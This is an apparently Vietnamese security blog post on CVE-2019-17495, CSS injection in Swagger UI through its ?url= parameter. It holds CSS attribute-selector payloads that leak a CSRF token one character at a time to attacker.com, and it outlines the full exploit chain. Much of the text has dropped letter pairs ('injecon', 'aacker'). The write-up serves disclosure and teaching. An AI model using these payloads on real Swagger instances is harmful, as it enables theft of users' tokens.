---
title: CSS injecon Swagger UI -  CVE-2019-17495
date: '2019-10-30T10:02:25+07:00'
categories:
  - 1day
Archives: '2019'
autoThumbnailImage: false
thumbnailImagePosition: top
coverImage: ''
---
[English version](https://github.com/tarantula-team/CSS-injection-in-Swagger-UI)

## 1. Swagger UI

Swagger UI cho phép bất cứ ai có thể là cá nhân hay nhóm phát triển phần mềm tương tác, trực quan hoá API mà không cần thực hiện triển khai logic nào. Nó sẽ tự động tạo ra từ OpenAPI, với tài liệu này dễ dàng cài đặt
phía backend và sử dụng phía client. [[1]](#1)

## 2. CSS injecon
Trước khi đọc phần phân tích kỹ thuật, người đọc nên có kiến thức cơ bản về kỹ thuật RPO [[2]](#2) [[3]](#3). RPO có thể hiểu cơ bản là sử dụng CSS injection để khai thác client‑side trong trường hợp bị lỗi HTML injecon mà khai thác XSS không khả thi.

RPO thực chất là sử dụng CSS injecon [[4]](#4) để hoàn thành chuỗi khai thác (chain gadgets) đánh cắp token của người dùng dựa vào tính năng attribute Selectors [5].

Chúng ta sẽ sử dụng attribute selectors để định nghĩa ra những quy tắc nhằm phát hiện những thay đổi giá trị trong từng thuộc nh nhạy cảm trên trang html.

```
input[name=csrf][value^=a]{
 background-image: url(https://attacker.com/exfil/a);
}
input[name=csrf][value^=b]{
 background-image: url(https://attacker.com/exfil/b);
}
...
input[name=csrf][value^=9]{
 background-image: url(https://attacker.com/exfil/9);
}
```

Trong ví dụ trên, nếu như form input có giá trị token bắt đầu là a thì sẽ tải hình ảnh từ máy chủ của kẻ tấn công có uri là /a , tương tự với b…z, 0…9, … Mỗi lần thu thập được 1 ký tự, chúng ta sẽ thực hiện lại cuộc tấn công với payload thay đổi đôi chút.

```
input[name=csrf][value^=aa]{
 background-image: url(https://attacker.com/exfil/ca);
}
input[name=csrf][value^=ab]{
 background-image: url(https://attacker.com/exfil/cb);
}
/* ... */
input[name=csrf][value^=a9]{
 background-image: url(https://attacker.com/exfil/c9);
}
```

Cứ như thế, kẻ tấn công sẽ thu thập được tất cả độ dài chuỗi token của nạn nhân.

Đây là điều kiện tiên quyết để chuỗi khai thác thành công:  

- CSS injection với độ dài payload đủ dài  
- Khả năng tái tạo lại payload mỗi lần thu thập được 1 ký tự  
- Có thể sử dụng được tài nguyên từ bên ngoài (bypass CSP)  

Chính vì payload bị thay đổi liên tục mà trong một số trường hợp không phải lúc nào cũng có thể thực hiện inject vào đối tượng, chính vì vậy cần sử dụng tính năng import trong CSS để giải quyết vấn đề này.

Trong CSS, có 2 cách để import file từ bên ngoài  
- Sử dụng tag link:  <link href="..." rel="stylesheet">  
- Sử dụng @import:  @import url(http://abc.com/base.css);

![abc](https://imgur.com/a/3IiUTTn)

Các bước khai thác phức tạp, không thể làm thủ công nên khuyến nghị sử dụng công cụ sic [[6]](#6)

## 3. CSS injecon to Swagger UI
Ý tưởng khai thác đến từ tài liệu do swagger cung cấp, theo như [[10]](#10)  
> We’ve observed that the ?url= parameter in SwaggerUI allows an aacker to override an otherwise hard‑coded schema file  
>
> The decision was made to put this in the public issue tracker because (a) we aren’t going to immediately fix this, and (b) the aack surface for this is significantly diminished by our effecve sanizaon efforts to deter XSS aacks in documents used as input  

Swagger cũng đã biết đến lỗ hổng tiềm ẩn này, tuy nhiên vì không thể khai thác XSS nên họ bỏ qua và không đề cao phát hiện này.

```
var url = window.location.search.match(/url=([^&]+)/);
// …
url = options.swaggerUrl || url
// …
var swaggerOptions = {
 spec: spec1,
 url: url,
 // …
}
var ui = SwaggerUIBundle(swaggerOptions)
```
Swagger UI cho phép người dùng nhúng json từ máy chủ khác mà không xác thực, điều này thể hiện rõ trong đoạn code javascript bên trên. Sau khi nhúng json qua tham số GET, trong file json đó nhúng thẻ <style> để tải file CSS từ máy chủ bên ngoài cùng lúc sử dụng kỹ thuật RPO gadgets ở trên ta dễ dàng thu được token của người dùng.

![](https://imgur.com/a/LTo7Yk7)
![](https://imgur.com/a/vv67tb3)

## Tham khảo
1. [Swagger UI | API Development Tools | Swagger](https://swagger.io/tools/swagger-ui/)
2. [Detecng and exploing path‑relave stylesheet import (PRSSI) vulnerabilies | PortSwigger Research](https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities)
3. [RPO](http://www.thespanner.co.uk/2014/03/21/rpo/)
4. [Exfiltraon via CSS Injecon ‑ InfoSec Write‑ups ‑ Medium](https://medium.com/bugbountywriteup/exfiltration-via-css-injection-4e999f63097d)
5. [Aribute selectors ‑ CSS: Cascading Style Sheets | MDN](https://developer.mozilla.org/en-US/docs/Web/CSS/Attribute_selectors)
6. [GitHub ‑ d0nutptr/sic: A tool to perform Sequenal Import Chaining](https://github.com/d0nutptr/sic)
7. [Beer Exfiltraon via HTML Injecon ‑ d0nut ‑ Medium](https://medium.com/@d0nut/better-exfiltration-via-html-injection-31c72a2dae8b)
8. [2019‑s3_css_injecon_aacks.pdf](https://vwzq.net/slides/2019-s3_css_injection_attacks.pdf)
9. [RPO Gadgets](https://blog.innerht.ml/rpo-gadgets/)
10. [add an enableQueryConfig opon ∙ Issue #4872 ∙ swagger‑api/swagger‑ui ∙ GitHub](https://github.com/swagger-api/swagger-ui/issues/4872)
11. [English version](https://github.com/tarantula-team/CSS-injection-in-Swagger-UI)
